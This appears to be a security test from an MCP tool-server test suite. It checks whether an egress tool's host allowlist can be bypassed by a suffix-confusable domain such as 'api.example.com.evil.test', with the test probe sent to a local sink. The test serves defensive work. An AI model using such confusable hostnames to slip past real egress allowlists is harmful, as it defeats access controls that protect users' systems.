"""EGRESS-001 — allowlist suffix confusion.

Premise: host allowlisting matches whole DNS labels, not string suffixes;
api.example.com.evil.com is not within api.example.com.

The attacker registers a child of the allowlisted host under their own domain.
A suffix/substring match lets it through; a whole-label match does not.
"""

import mcpsb
from mcpsb import Verdict
from attacks._helpers import client

_PROBE = "/egress-001-probe"


@mcpsb.test(id="EGRESS-001", surfaces="b", evidence="sink")
def egress_001(ctx):
    if ctx.observation is None:
        ctx.reason = "no observation plane; cannot establish the test"
        return Verdict.INCONCLUSIVE

    obs = ctx.observation
    obs.sink.recorder.clear()
    s = ctx.scenario
    confusable = f"{s.allowlisted_host}.evil.test"  # e.g. api.example.com.evil.test
    obs.dns.controller.set_static(confusable, "127.0.0.1")

    c = client(ctx, token=s.principal_a_token)
    url = f"http://{confusable}:{obs.sink.port}{_PROBE}"
    try:
        c.tools_call(s.egress_tool, {s.egress_url_arg: url})
    except Exception:  # noqa: BLE001
        pass

    if obs.sink.recorder.received(path=_PROBE):
        ctx.reason = "a confusable child of the allowlisted host was reached"
        ctx.evidence = {"sink": _PROBE}
        return Verdict.FAIL
    ctx.reason = "whole-label match rejected the confusable host"
    return Verdict.PASS
